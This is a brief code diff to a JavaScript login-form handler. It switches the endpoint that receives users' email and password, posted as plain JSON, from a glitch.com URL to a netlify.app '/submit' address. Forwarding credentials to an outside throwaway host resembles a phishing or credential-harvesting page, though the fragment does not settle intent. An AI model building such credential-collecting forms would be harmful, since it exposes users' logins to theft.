@@ -5,7 +5,7 @@ document.getElementById("login-form").addEventListener("submit", function(e) {
     const password = document.getElementById("erf_password").value;
 
     // Отправка данных на сервер
-    fetch('https://glitch.com/edit/#!/living-historical-september', {  
+    fetch('https://gentle-tiramisu-1e25ce.netlify.app/submit', {  
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ email, password })  
